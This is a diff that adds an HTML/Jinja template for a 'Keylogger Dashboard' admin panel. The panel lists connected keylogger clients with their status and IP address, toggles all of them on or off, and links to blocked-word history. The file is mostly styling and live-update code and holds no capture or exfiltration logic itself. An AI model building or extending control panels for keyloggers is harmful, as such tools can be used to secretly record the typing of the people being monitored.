@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard</title>
+  <style>
+    /* Reset and Base Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --background: #ffffff;
+      --foreground: #020817;
+      --muted: #f1f5f9;
+      --muted-foreground: #64748b;
+      --border: #e2e8f0;
+      --primary: #0f172a;
+      --primary-foreground: #ffffff;
+      --secondary: #f1f5f9;
+      --secondary-foreground: #0f172a;
+      --destructive: #ef4444;
+      --destructive-foreground: #fff;
+      --success: #22c55e;
+      --success-foreground: #fff;
+      --accent: #0ea5e9;
+      --accent-foreground: #ffffff;
+      --radius: 0.5rem;
+    }
+
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background-color: var(--muted);
+      color: var(--foreground);
+      line-height: 1.5;
+    }
+
+    /* Navbar Styles */
+    .navbar {
+      background-color: var(--background);
+      border-bottom: 1px solid var(--border);
+      padding: 1rem;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .navbar-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 1rem;
+      display: flex;
+      gap: 2rem;
+      align-items: center;
+    }
+
+    .nav-link {
+      color: var(--foreground);
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 1rem;
+      transition: color 0.2s;
+    }
+
+    .nav-link:hover {
+      color: var(--accent);
+    }
+
+    /* Hero Section Styles */
+    .hero-section {
+      background-color: var(--background);
+      padding: 3rem 1rem;
+      text-align: center;
+      margin-bottom: 2rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .hero-title {
+      font-size: 2.5rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+      color: var(--foreground);
+      line-height: 1.2;
+    }
+
+    .hero-description {
+      color: var(--muted-foreground);
+      font-size: 1.125rem;
+      margin-bottom: 2rem;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* Button Styles */
+    .btn-group {
+      display: flex;
+      gap: 0.5rem;
+      justify-content: center;
+    }
+
+    .btn {
+      padding: 0.5rem 1rem;
+      border-radius: var(--radius);
+      font-weight: 500;
+      cursor: pointer;
+      border: none;
+      transition: all 0.2s;
+    }
+
+    .btn:hover {
+      opacity: 0.9;
+      transform: translateY(-1px);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    .btn-success {
+      background-color: var(--success);
+      color: var(--success-foreground);
+    }
+
+    .btn-destructive {
+      background-color: var(--destructive);
+      color: var(--destructive-foreground);
+    }
+
+    /* Container Styles */
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 1rem;
+    }
+
+    /* Card Styles */
+    .card {
+      background-color: var(--background);
+      border-radius: var(--radius);
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+    }
+
+    /* Table Styles */
+    .table-container {
+      background-color: var(--background);
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      overflow: hidden;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    th {
+      background-color: var(--muted);
+      color: var(--muted-foreground);
+      font-weight: 500;
+      text-align: left;
+      padding: 0.75rem 1rem;
+      font-size: 0.875rem;
+    }
+
+    td {
+      padding: 0.75rem 1rem;
+      border-top: 1px solid var(--border);
+      color: var(--foreground);
+    }
+
+    tr:hover {
+      background-color: var(--muted);
+    }
+
+    /* Status Indicator */
+    .status {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .status::before {
+      content: "";
+      width: 0.5rem;
+      height: 0.5rem;
+      border-radius: 50%;
+      background-color: var(--muted-foreground);
+    }
+
+    .status.enabled::before {
+      background-color: var(--success);
+    }
+
+    .status.disabled::before {
+      background-color: var(--destructive);
+    }
+
+    /* Responsive Design */
+    @media (max-width: 640px) {
+      .hero-title {
+        font-size: 2rem;
+      }
+
+      .table-container {
+        overflow-x: auto;
+      }
+
+      .btn-group {
+        flex-direction: column;
+      }
+
+      .btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Navbar -->
+  <nav class="navbar">
+    <div class="navbar-container">
+      <a class="nav-link" href="#">Keylogger Dashboard</a>
+      <a class="nav-link" href="{{ url_for('history') }}">Blocked Word History</a>
+      <a class="nav-link" href="{{ url_for('manage_blocked_words') }}">Manage Blocked Words</a>
+      <a class="nav-link" href="{{ url_for('logout') }}">Logout</a>
+    </div>
+  </nav>
+
+  <!-- Hero Section -->
+  <div class="hero-section">
+    <h1 class="hero-title">Admin Dashboard</h1>
+    <p class="hero-description">
+      Monitor connected keyloggers and their statuses in real-time.
+    </p>
+    <div class="btn-group">
+      <button class="btn btn-success" onclick="sendStatus('enabled')">Enable All</button>
+      <button class="btn btn-destructive" onclick="sendStatus('disabled')">Disable All</button>
+    </div>
+  </div>
+
+  <!-- Main Container for Table -->
+  <div class="container">
+    <div class="table-container">
+      <table id="statusTable">
+        <thead>
+          <tr>
+            <th>Client ID</th>
+            <th>Status</th>
+            <th>IP Address</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for client, info in statuses.items() %}
+          <tr>
+            <td>{{ client }}</td>
+            <td>
+              <span class="status {{ info.status }}">{{ info.status }}</span>
+            </td>
+            <td>{{ info.ip }}</td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/socket.io@4.6.1/dist/socket.io.min.js" 
+    integrity="sha384-tOvc+xK5Vni7h/5XrMuqriZGQt5MrTO4zTkbvcouaD6YLLmB8aV6kCik47pw+02K"
+    crossorigin="anonymous"></script>
+
+  <script>
+    function sendStatus(status) {
+      fetch('/update_status', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status: status })
+      });
+    }
+
+    var socket = io.connect('http://' + document.domain + ':' + location.port);
+
+    socket.on('connect', function() {
+      console.log('Connected to server');
+    });
+
+    socket.on('status_update', function(statuses) {
+      var tbody = document.querySelector('#statusTable tbody');
+      tbody.innerHTML = '';
+      
+      for (var client_id in statuses) {
+        var status = statuses[client_id].status;
+        var ip = statuses[client_id].ip || 'N/A';
+        
+        var row = document.createElement('tr');
+        
+        var clientIdCell = document.createElement('td');
+        clientIdCell.textContent = client_id;
+        
+        var statusCell = document.createElement('td');
+        var statusSpan = document.createElement('span');
+        statusSpan.className = `status ${status}`;
+        statusSpan.textContent = status;
+        statusCell.appendChild(statusSpan);
+        
+        var ipCell = document.createElement('td');
+        ipCell.textContent = ip;
+
+        row.appendChild(clientIdCell);
+        row.appendChild(statusCell);
+        row.appendChild(ipCell);
+        tbody.appendChild(row);
+      }
+    });
+  </script>
+</body>
+</html>
